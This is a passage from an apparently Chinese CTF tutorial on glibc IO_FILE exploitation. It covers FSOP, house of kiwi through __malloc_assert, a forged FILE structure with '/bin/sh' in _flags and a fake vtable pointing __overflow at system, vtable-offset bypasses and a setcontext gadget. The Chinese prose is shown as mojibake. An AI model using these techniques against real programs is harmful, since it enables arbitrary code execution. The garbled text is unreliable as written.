class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ...</span><br><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">       || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">           &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">       )</span><br><span class="line">      &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">    result = EOF;</span><br><span class="line"> </span><br><span class="line">    fp = fp-&gt;_chain; <span class="comment">//ÈÅçÂéÜÈìæË°®</span></span><br><span class="line">    &#125;</span><br><span class="line">    [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÂèØ‰ª•ÁúãÂà∞ÔºåÂú®ÁªèÂéÜ‰∏ÄÁ≥ªÂàóÊù°‰ª∂Âà§Êñ≠ÂêéÔºåÁ®ãÂ∫è‰ºöË∞ÉÁî®ËôöË°®‰∏≠ÁöÑ<code>_IO_OVERFLOW</code> ÂáΩÊï∞ÔºåËÄåËôöË°®ÊåáÈíàÊòØÂèØ‰ª•Áî±Êàë‰ª¨‰º™ÈÄ†ÁöÑ„ÄÇÊâÄ‰ª•ÂêàÁêÜÂ∏ÉÂ±ÄÔºåËß¶ÂèëËØ•ÂáΩÊï∞ÔºåÂ∞±ËÉΩËøõÂÖ•Êàë‰ª¨‰º™ÈÄ†ÁöÑÊâßË°åÊµÅ„ÄÇ</p><p>‰∏ãÈù¢ËÆ≤Â¶Ç‰ΩïËææÊàêË∞ÉÁî®<code>_IO_OVERFLOW</code>ÂáΩÊï∞ÁöÑÊù°‰ª∂Ôºö</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">       || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">           &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">       )</span><br><span class="line">      &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br></pre></td></tr></table></figure><p>Ê†πÊçÆÁü≠Ë∑ØÂéüÂàôÔºåÊâßË°å<code>_IO_OVERFLOW</code>ÈúÄË¶ÅÊª°Ë∂≥ÂâçÈù¢ÁöÑÊù°‰ª∂‰∏∫ÁúüÔºåËøôÈáåÊúâ‰∏Ä‰∏™ÊàñËØ≠Âè•ÔºåÊïÖÊúâ‰∏§ÁßçËææÊàêÊù°‰ª∂ÔºåÊª°Ë∂≥‰ªª‰∏ÄÂç≥ÂèØÔºö</p><p>1.<br>   <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fp-&gt;_mode = <span class="number">0</span></span><br><span class="line">fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span><br></pre></td></tr></table></figure></p><p>   ËøôÊòØËæÉ‰∏∫Â∏∏Áî®ÁöÑËææÊàêÊù°‰ª∂ÔºåÂè™ÈúÄ‰º™ÈÄ†<code>_IO_FILE</code>‰∏≠ÁöÑ<code>_IO_write_ptr</code>„ÄÅ<code>_IO_write_base</code>Âíå<code>_mode</code>Âç≥ÂèØËææÊàê</p><p>2.<br>   <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">fp-&gt;_mode &gt; <span class="number">0</span></span><br><span class="line">fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</span><br></pre></td></tr></table></figure></p><p>   ËØ•Êù°‰ª∂ÂèØ‰ª•ÁªìÂêà<strong>house of cat</strong>‰ΩøÁî®„ÄÇÂÖ∂‰∏≠<code>_IO_vtable_offset (fp) == 0</code> Âç≥ <code>_vtable_offset</code>‰∏∫0ÔºåÂè¶Â§ñÈúÄË¶ÅÂÖ≥Ê≥®<code>_wide_data</code>ÁªìÊûÑ‰ΩìÔºåËØ•ÊâãÊ≥ï‰ºöÂú®house of cat‰∏≠ËÆ≤Ëß£</p><p>Êù°‰ª∂Êª°Ë∂≥ÂêéÔºå‰ºö‰ªé<code>_IO_list_all</code>ÂºÄÂßãÊ≤øÁùÄ<code>fp -&gt; chain</code>ÈÅçÂéÜFILEÁªìÊûÑ‰ΩìÔºåÊâßË°åÂØπÂ∫îËôöË°®‰∏≠ÁöÑ<code>_IO_OVERFLOW</code>ÔºåÂç≥<code>&lt;_IO_file_jumps+24&gt;</code></p><h3 id="house-of-kiwi-malloc-assert"><a href="#house-of-kiwi-malloc-assert" class="headerlink" title="house of kiwi - __malloc_assert"></a>house of kiwi - __malloc_assert</h3><p>ËØ•ÊâãÊ≥ïÁî®‰∫éÂú®Á®ãÂ∫èÊó†<code>exit</code>Êó∂Ëß¶ÂèëIOÔºå‰∏îËÉΩÊéßÂà∂<code>rdx</code></p><p>‰ª•‰∏ã‰∏∫<code>__malloc_assert</code>ÁöÑ‰ª£Á†ÅÁâáÊÆµ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">__malloc_assert (<span class="type">const</span> <span class="type">char</span> *assertion, <span class="type">const</span> <span class="type">char</span> *file, <span class="type">unsigned</span> <span class="type">int</span> line,</span><br><span class="line">       <span class="type">const</span> <span class="type">char</span> *function)</span><br><span class="line">&#123;</span><br><span class="line">(<span class="type">void</span>) __fxprintf (<span class="literal">NULL</span>, <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,</span><br><span class="line">           __progname, __progname[<span class="number">0</span>] ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">           file, line,</span><br><span class="line">           function ? function : <span class="string">&quot;&quot;</span>, function ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">           assertion);</span><br><span class="line">fflush (<span class="built_in">stderr</span>);</span><br><span class="line"><span class="built_in">abort</span> ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ËØ•ÂáΩÊï∞Ë∞ÉÁî®ÁöÑ<code>__fxprintf</code>„ÄÅ<code>fflush</code>ÈÉΩËÉΩË∞ÉÁî®ËôöË°®‰∏≠ÂáΩÊï∞ÔºåÊúâÂä´ÊåÅÁöÑÂèØËÉΩ„ÄÇ</p><p>‰ª•‰∏ãÊòØËøõÂÖ•<code>__malloc_assert</code>ÁöÑÊñπÊ≥ï</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">assert ((old_top == initial_top (av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">        ((<span class="type">unsigned</span> <span class="type">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">         prev_inuse (old_top) &amp;&amp;</span><br><span class="line">         ((<span class="type">unsigned</span> <span class="type">long</span>) old_end &amp; (pagesize - <span class="number">1</span>)) == <span class="number">0</span>));</span><br></pre></td></tr></table></figure><p>‰∏çÊª°Ë∂≥‰ª•‰∏ãÊù°‰ª∂‰ªª‰∏ÄÂç≥ÂèØËøõÂÖ•Ôºö</p><ol><li><code>old_size &gt;=MINSIZE</code></li><li><code>old_top.pre_inuse = 0</code></li><li><code>old_topÈ°µÂØπÈΩê</code></li></ol><p>ÈÄöÂ∏∏Áî®ÁöÑÊØîËæÉÂ§öÁöÑÊòØÁ¨¨‰∏âÁßçÔºåÂõ†‰∏∫È°µÂØπÈΩêÊù°‰ª∂ËæÉËãõÂàªÔºåÈÄöÂ∏∏‰øÆÊîπtopchunkÁöÑsizeÈÉΩËÉΩ‰∏çÂØπÈΩê„ÄÇÊ≥®ÊÑè<strong>‰∏çËÉΩÊîπÁöÑÂ§™Â§ß</strong>ÔºåÂê¶Âàô‰ºöËøõÂÖ•Âà´ÁöÑassert„ÄÇËøôÈáå‰øÆÊîπÁöÑÊñπÂºè‰∏ÄËà¨ÊòØÊûÑÈÄ†<strong>Â†ÜÈáçÂè†</strong>Êàñ<strong>largebin attack</strong></p><p>Êé•‰∏ãÊù•ËÆ≤ÂáΩÊï∞ÁöÑË∞ÉÁî®ÈìæÔºåËøôÈáåÂàÜ<code>__fxprintf</code>Âíå<code>fflush</code>‰∏§ÁßçÊñπÂºè</p><h4 id="fxprintf"><a href="#fxprintf" class="headerlink" title="__fxprintf"></a>__fxprintf</h4><p>Ë∞ÉÁî®Èìæ‰∏∫</p><p><code>__fxprintf -&gt; __vfxprintf -&gt; locked_vfxprintf -&gt; __vfprintf_internal -&gt; _IO_new_file_xsputn </code></p><p>ÈúÄË¶ÅÊª°Ë∂≥ÁöÑÊù°‰ª∂‰∏∫Ôºö</p><ol><li><code>_IO_write_ptr</code> &gt; <code>_IO_write_base</code></li><li><code>_lock</code>ÊåáÂêëÂèØÂÜôÂú∞ÂùÄ</li></ol><p>Ë∞ÉÁî®ÂêéÔºå‰ªÖÂà∑Êñ∞<code>stderr</code>ÔºåË∞ÉÁî®ËôöË°®<code>_IO_file_jumps</code>‰∏≠ÁöÑ<code>_IO_new_file_xsputn</code>ÔºåÂç≥<code>&lt;_IO_file_jumps+56&gt;</code></p><h4 id="fflush"><a href="#fflush" class="headerlink" title="fflush"></a>fflush</h4><p><code>fflush(stderr) =&gt; _IO_file_jumps =&gt; sync</code></p><p>Áî®ÁöÑÊØîËæÉÂ∞ëÔºåÊ≤°‰ªÄ‰πàÊù°‰ª∂„ÄÇ‰ΩÜÊòØÂõ†‰∏∫Âú®<code>__fxprinf</code>‰πãÂêéÔºåÊâÄ‰ª•ÈúÄË¶Å‰øùËØÅ<code>__fxprinf</code>‰∏ç‰ºöÊåÇÊéâ„ÄÇ</p><p>Â•ΩÂ§ÑÊòØÈÄöËøáËøôÊù°Ë∞ÉÁî®ÈìæÔºåÂú®Ë∞ÉÁî®<code>sync</code>Êó∂ÁöÑ<code>rdx</code>Âõ∫ÂÆöÔºåÈÉΩÊòØ<code>IO_helper_jumps</code>ÔºåÂèØ‰ª•ÁªìÂêàÂêéÈù¢ËÆ≤Âà∞ÁöÑ<code>&lt;setcontext+61&gt;</code>Âà©Áî®„ÄÇ‰∏çËøáÈ´òÁâàÊú¨‰∏≠Âä†ÂÖ•ËôöË°®Ê£ÄÊµãÔºåËøôÁßçÂà©Áî®ÂèòÂæóÂõ∞Èöæ</p><h2 id="‰º™ÈÄ†FILEÁªìÊûÑ‰Ωì"><a href="#‰º™ÈÄ†FILEÁªìÊûÑ‰Ωì" class="headerlink" title="‰º™ÈÄ†FILEÁªìÊûÑ‰Ωì"></a>‰º™ÈÄ†FILEÁªìÊûÑ‰Ωì</h2><p>Â¶Ç‰ΩïËÆ©Êàë‰ª¨‰º™ÈÄ†ÁöÑFILEÁªìÊûÑ‰ΩìÂú®Ëß¶ÂèëIOÊó∂Ë¢´Âà∑Êñ∞Ôºü</p><p>Â¶ÇÊûú‰ΩøÁî®<strong>FSOP</strong>ÁöÑÊñπÂºèÔºåÁ®ãÂ∫è‰ªé<code>_IO_list_all</code>ÂºÄÂßãÊ≤øÁùÄ<code>fp -&gt; chain</code>ÈÅçÂéÜ„ÄÇÊïÖÊàë‰ª¨ÂèØ‰ª•‰øÆÊîπ<code>_IO_list_all</code>ÊåáÈíàÔºåÊåáÂêëÊàë‰ª¨‰º™ÈÄ†ÁöÑÁªìÊûÑ‰ΩìÔºåÂ¶ÇÊûú‰ΩøÁî®largebin attackÂ∞±ÂèØ‰ª•‰∏ÄÊ≠•Âà∞‰ΩçÊåáÂêëÂ∏ÉÁΩÆÂú®chunk‰∏äÁöÑ‰º™ÈÄ†ÁªìÊûÑ‰Ωì„ÄÇÂêåÊó∂ËøòÂèØ‰ª•‰øÆÊîπ<code>_chain</code>ÊåáÈíàÔºåÂä´ÊåÅÂà∞Â§ö‰∏™‰º™ÈÄ†ÁöÑÁªìÊûÑ‰ΩìÁöÑÂà©Áî®Èìæ</p><p>Â¶ÇÊûú‰ΩøÁî®<strong>house of kiwi</strong>ÁöÑÊñπÂºèÔºåÁ®ãÂ∫è‰ªÖÂà∑Êñ∞<code>stderr</code>ÔºåÂèØ‰ª•‰øÆÊîπ<code>stderr</code>ÊåáÈíàÔºàÂ¶ÇÊûúÂèØÂÜôÔºâÔºåÁîöËá≥Áõ¥Êé•‰øÆÊîπ<code>_IO_2_1_stderr</code>ÁöÑÂÜÖÂÆπ</p><p>‰º™ÈÄ†FILEÁöÑÊâãÊ≥ïÁπÅÂ§öÔºåËøôÈáå‰∏æÂá∫ÊúÄÂéüÂßãÁöÑ‰∏ÄÁßçÊâãÊ≥ï‰Ωú‰∏∫‰æãÂ≠ê</p><h3 id="‰∏äÂè§Êó∂ÊúüÁöÑFSOP-Glibc"><a href="#‰∏äÂè§Êó∂ÊúüÁöÑFSOP-Glibc" class="headerlink" title="‰∏äÂè§Êó∂ÊúüÁöÑFSOP(Glibc&lt;2.24)"></a>‰∏äÂè§Êó∂ÊúüÁöÑFSOP(Glibc&lt;2.24)</h3><p>Âõ†‰∏∫Ëß¶ÂèëFSOPÊó∂Ôºå‰ºöË∞ÉÁî®ËôöË°®‰∏≠<code>&lt;_IO_file_jumps+24&gt;</code>Â§ÑÁöÑ<code>__overflow</code>ÂáΩÊï∞ÔºåÊàë‰ª¨Âè™ÈúÄÊääËØ•‰ΩçÁΩÆÂ°´ÂÖ•<code>system</code>ÁöÑÂú∞ÂùÄ„ÄÇÂΩìÁÑ∂ÔºåËôöË°®‰∏çÂèØÂÜôÔºåÊàë‰ª¨ÂèØ‰ª•Â∞Ü<code>vtable</code>Â§ÑÊîπ‰∏∫Êàë‰ª¨‰º™ÈÄ†ÁöÑËôöË°®„ÄÇÂêåÊó∂Ê≠§Êó∂ÁöÑ<code>rdi</code>ÊåáÂêëFILEÁªìÊûÑ‰ΩìÁöÑ<code>_flags</code>ÔºåÊâÄ‰ª•ÂèØ‰ª•Â∞ÜËØ•‰ΩçÁΩÆÂ°´‰∏ä<code>/bin/sh</code></p><p>ÊûÑÈÄ†ÊñπÂºèÂ¶Ç‰∏ãÔºö</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">._chain =&gt; chunk_addr1</span><br><span class="line">chunk_addr1</span><br><span class="line">&#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = <span class="string">&quot;/bin/sh\x00&quot;</span>, <span class="comment">//ÂØπÂ∫îÊ≠§ÁªìÊûÑ‰ΩìÈ¶ñÂú∞ÂùÄ(fp)</span></span><br><span class="line">    _IO_read_ptr = <span class="number">0x0</span>,</span><br><span class="line">    _IO_read_end = <span class="number">0x0</span>,</span><br><span class="line">    _IO_read_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_write_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_write_ptr = <span class="number">0x1</span>,</span><br><span class="line">      ...</span><br><span class="line">      _mode = <span class="number">0x0</span>, <span class="comment">//‰∏ÄËà¨‰∏çÁî®ÁâπÊÑèËÆæÁΩÆ</span></span><br><span class="line">      _unused2 = <span class="string">&#x27;\000&#x27;</span> &lt;repeats <span class="number">19</span> times&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = chunk_addr2</span><br><span class="line">&#125;</span><br><span class="line">chunk_addr2</span><br><span class="line">&#123;</span><br><span class="line">  __dummy = <span class="number">0x0</span>,</span><br><span class="line">  __dummy2 = <span class="number">0x0</span>,</span><br><span class="line">  __finish = <span class="number">0x0</span>,</span><br><span class="line">  __overflow = system_addr,</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Âπ≤ÂáÄÂèàÂç´Áîü</p><h3 id="ËôöË°®ÂÅèÁßªÊó∂‰ª£-Glibc-2-24"><a href="#ËôöË°®ÂÅèÁßªÊó∂‰ª£-Glibc-2-24" class="headerlink" title="ËôöË°®ÂÅèÁßªÊó∂‰ª£(Glibc&gt;&#x3D;2.24)"></a>ËôöË°®ÂÅèÁßªÊó∂‰ª£(Glibc&gt;&#x3D;2.24)</h3><p>Âä†ÂÖ•‰∫ÜÂØπËôöË°®ÁöÑÊ£ÄÊü•<code>IO_validate_vtable()</code>‰∏é<code>IO_vtable_check()</code>ÔºåËã•Êó†Ê≥ïÈÄöËøáÊ£ÄÊü•ÔºåÂàô‰ºöÊä•ÈîôÔºö<code>Fatal error: glibc detected an invalid stdio handle</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t * <span class="title function_">IO_validate_vtable</span> <span class="params">(<span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *vtable)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *ptr = (<span class="type">const</span> <span class="type">char</span> *) vtable;</span><br><span class="line">  <span class="type">uintptr_t</span> offset = ptr - __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= section_length)) <span class="comment">//Ê£ÄÊü•vtableÊåáÈíàÊòØÂê¶Âú®glibcÁöÑvtableÊÆµ‰∏≠„ÄÇ</span></span><br><span class="line">    _IO_vtable_check ();</span><br><span class="line">  <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>glibc‰∏≠Êúâ‰∏ÄÊÆµÂÆåÊï¥ÁöÑÂÜÖÂ≠òÂ≠òÊîæÁùÄÂêÑ‰∏™<code>vtable</code>ÔºåÂÖ∂‰∏≠<code>__start___libc_IO_vtables</code>ÊåáÂêëÁ¨¨‰∏Ä‰∏™<code>vtable</code>Âú∞ÂùÄ<code>_IO_helper_jumps</code>ÔºåËÄå<code>__stop___libc_IO_vtables</code>ÊåáÂêëÊúÄÂêé‰∏Ä‰∏™<code>vtable</code> <code>_IO_str_chk_jumps</code>ÁªìÊùüÁöÑÂú∞ÂùÄ„ÄÇËã•ÊåáÈíà‰∏çÂú®glibcÁöÑ<code>vtable</code>ÊÆµÔºå‰ºöË∞ÉÁî®<code>_IO_vtable_check()</code>ÂÅöËøõ‰∏ÄÊ≠•Ê£ÄÊü•Ôºå‰ª•Âà§Êñ≠Á®ãÂ∫èÊòØÂê¶‰ΩøÁî®‰∫ÜÂ§ñÈÉ®ÂêàÊ≥ïÁöÑ<code>vtable</code>ÔºàÈáçÊûÑÊàñÊòØÂä®ÊÄÅÈìæÊé•Â∫ì‰∏≠ÁöÑ<code>vtable</code>ÔºâÔºåÂ¶ÇÊûú‰∏çÊòØÂàôÊä•Èîô„ÄÇ</p><p>2.37‰ª•ÂâçÊúâ‰ª•‰∏ãËôöË°®</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">_IO_helper_jumps</span><br><span class="line">_IO_helper_jumps</span><br><span class="line">_IO_cookie_jumps</span><br><span class="line">_IO_proc_jumps</span><br><span class="line">_IO_str_chk_jumps</span><br><span class="line">_IO_wstrn_jumps</span><br><span class="line">_IO_wstr_jumps</span><br><span class="line">_IO_wfile_jumps_maybe_mmap</span><br><span class="line">_IO_wfile_jumps_mmap</span><br><span class="line">__GI__IO_wfile_jumps</span><br><span class="line">_IO_wmem_jumps</span><br><span class="line">_IO_mem_jumps</span><br><span class="line">_IO_strn_jumps</span><br><span class="line">_IO_obstack_jumps</span><br><span class="line">_IO_file_jumps_maybe_mmap</span><br><span class="line">_IO_file_jumps_mmap</span><br><span class="line">__GI__IO_file_jumps</span><br><span class="line">_IO_str_jumps</span><br></pre></td></tr></table></figure><p>‰ªéÊ≠§ÔºåËôöË°®ÊåáÈíà‰∏çËÉΩÈöèÊÑè‰º™ÈÄ†‰∫Ü„ÄÇÂ•ΩÂú®Ëøô‰∏™Ê£ÄÊµã‰æùÊóßÊØîËæÉÂÆΩÊ≥õÔºåÊàë‰ª¨‰æùÊóßÂèØ‰ª•‰øÆÊîπ<code>vtable</code>‰∏∫ËôöË°®ÂÜÖÁöÑÂÖ∂‰ªñÊåáÈíàÔºåÈÄöËøá‰∏ÄÂÆöÁöÑ<strong>ÂÅèÁßª</strong>Ë∞ÉÁî®<strong>ÂÖ∂‰ªñËôöË°®</strong>ÂÜÖÁöÑÂáΩÊï∞</p><p>‰æãÂ¶ÇÔºåÂéüÊú¨house of kiwi‰ºöËß¶Âèë<code>&lt;_IO_file_jumps+56&gt;</code>Â§ÑÁöÑ<code>_IO_new_file_xsputn</code>ÂáΩÊï∞ÔºåÊàë‰ª¨Â∏åÊúõË∞ÉÁî®<code>&lt;_IO_cookie_jumps+120&gt;</code>Â§ÑÁöÑ<code>_IO_cookie_write</code>ÂáΩÊï∞„ÄÇÂéüÊú¨<code>vtable</code>ÊåáÂêë<code>_IO_file_jumps</code>ÔºåË∞ÉÁî®ÂáΩÊï∞Êó∂Âàô‰ºöÂ∞ÜÊåáÈíàÂä†‰∏ä56„ÄÇÊàë‰ª¨Êää<code>vtable</code>ËÆæÁΩÆ‰∏∫<code>&lt;_IO_cookie_jumps+64&gt;</code>ÔºåÈÇ£‰πàÂú®ÂÆûÈôÖË∞ÉÁî®Êó∂ÔºåÂ∞±‰ºöË∞ÉÁî®Âà∞<code>&lt;_IO_cookie_jumps+64+56&gt;</code>Â§ÑÁöÑÁõÆÊ†áÂáΩÊï∞„ÄÇËøôÂ∞±ÊòØ<strong>ËôöË°®ÂÅèÁßª</strong>ÁöÑÊÄùÊÉ≥ÔºåÂ∞ÜÊâßË°åÊµÅÂä´ÊåÅÂà∞Â∑≤ÊúâÁöÑÂáΩÊï∞‰∏ä„ÄÇ</p><h1 id="Êñ∞Êó∂‰ª£ÁöÑÈ´òÁâàÊú¨IOFILEÂà©Áî®"><a href="#Êñ∞Êó∂‰ª£ÁöÑÈ´òÁâàÊú¨IOFILEÂà©Áî®" class="headerlink" title="Êñ∞Êó∂‰ª£ÁöÑÈ´òÁâàÊú¨IOFILEÂà©Áî®"></a>Êñ∞Êó∂‰ª£ÁöÑÈ´òÁâàÊú¨IOFILEÂà©Áî®</h1><p>È´òÁâàÊú¨‰∏ãÁöÑIOFILEÂà©Áî®ÊñπÂºèÂæàÂ§öÔºå‰ΩÜÂ§ßÂ§ö‰∏çÂ§ñ‰πéÈÉΩÊòØÂà©Áî®<strong>ËôöË°®ÂÅèÁßª</strong>ÁöÑÊÄùÊÉ≥‰º™ÈÄ†FILEÁªìÊûÑ‰ΩìÔºåÂπ∂ÈÄöËøá‰ª•‰∏äÁöÑÊñπÂºè<strong>Ëß¶ÂèëIO</strong>Ôºå‰ªéËÄågetshellÊàñËÄÖorw</p><p>ËøôÈáå‰ªãÁªçÂá†Áßç<del>Êàë‰ºöÁöÑ</del>ÊØîËæÉÂ•ΩÁî®ÁöÑ</p><h2 id="house-of-kiwi"><a href="#house-of-kiwi" class="headerlink" title="house of kiwi"></a>house of kiwi</h2><p>Áõ∏ËæÉ‰∫é‰ªñÁöÑÂÆûÊàòÊÑè‰πâÔºåkiwiÊõ¥Â§ßÁöÑ‰ª∑ÂÄºÂèØËÉΩÂú®‰∫éÂÆÉÁöÑ‰∏§Êù°ÊÄùË∑ØÔºå‰∏ÄÊù°ÊòØ‰∏äÊñáÊèêÂà∞ÁöÑ<code>__malloc_assert</code>Ëß¶ÂèëIOÔºåÂè¶‰∏ÄÊù°ÂàôÊòØ<code>setcontext&lt;+61&gt;</code></p><p>ËøôÊòØ‰∏Ä‰∏™ÂáΩÊï∞ÁöÑÁâáÊÆµÔºåÂÖºÂÖ∑<strong>Â∏ÉÁΩÆÂØÑÂ≠òÂô®„ÄÅÊ†àËøÅÁßª</strong>ÁöÑÂäüËÉΩÔºåÂ∏∏Â∏∏Âú®Ê≤ôÁõíÈôêÂà∂<code>execve</code>ÁöÑÊÉÖÂÜµ‰∏ãÁî®Êù•Êâì<strong>orwÈìæ</strong>ÔºåÊ±áÁºñ‰ª£Á†ÅÂ¶Ç‰∏ã</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">0x00007fa70ef04a6d &lt;+61&gt;:    mov    rsp,QWORD PTR [rdx+0xa0]</span><br><span class="line">0x00007fa70ef04a74 &lt;+68&gt;:    mov    rbx,QWORD PTR [rdx+0x80]</span><br><span class="line">0x00007fa70ef04a7b &lt;+75&gt;:    mov    rbp,QWORD PTR [rdx+0x78]</span><br><span class="line">0x00007fa70ef04a7f &lt;+79&gt;:    mov    r12,QWORD PTR [rdx+0x48]</span><br><span class="line">0x00007fa70ef04a83 &lt;+83&gt;:    mov    r13,QWORD PTR [rdx+0x50]</span><br><span class="line">0x00007fa70ef04a87 &lt;+87&gt;:    mov    r14,QWORD PTR [rdx+0x58]</span><br><span class="line">0x00007fa70ef04a8b &lt;+91&gt;:    mov    r15,QWORD PTR [rdx+0x60]</span><br><span class="line">0x00007fa70ef04a8f &lt;+95&gt;:    test   DWORD PTR fs:0x48,0x2</span><br><span class="line">0x00007fa70ef04a9b &lt;+107&gt;:   je     0x7fa70ef04b56 &lt;setcontext+294&gt;#Âü∫Êú¨‰∏äÈÉΩËÉΩË∑≥</span><br><span class="line">---&gt;</span><br><span class="line">0x00007fa70ef04b56 &lt;+294&gt;:   mov    rcx,QWORD PTR [rdx+0xa8]</span><br><span class="line">0x00007fa70ef04b5d &lt;+301&gt;:   push   rcx</span><br><span class="line">0x00007fa70ef04b5e &lt;+302&gt;:   mov    rsi,QWORD PTR [rdx+0x70]</span><br><span class="line">0x00007fa70ef04b62 &lt;+306&gt;:   mov    rdi,QWORD PTR [rdx+0x68]</span><br><span class="line">0x00007fa70ef04b66 &lt;+310&gt;:   mov    rcx,QWORD PTR [rdx+0x98]</span><br><span class="line">0x00007fa70ef04b6d &lt;+317&gt;:   mov    r8,QWORD PTR [rdx+0x28]</span><br><span class="line">0x00007fa70ef04b71 &lt;+321&gt;:   mov    r9,QWORD PTR [rdx+0x30]</span><br><span class="line">0x00007fa70ef04b75 &lt;+325&gt;:   mov    rdx,QWORD PTR [rdx+0x88]</span><br><span class="line">0x00007fa70ef04b7c &lt;+332&gt;:   xor    eax,eax</span><br><span class="line">0x00007fa70ef04b7e &lt;+334&gt;:   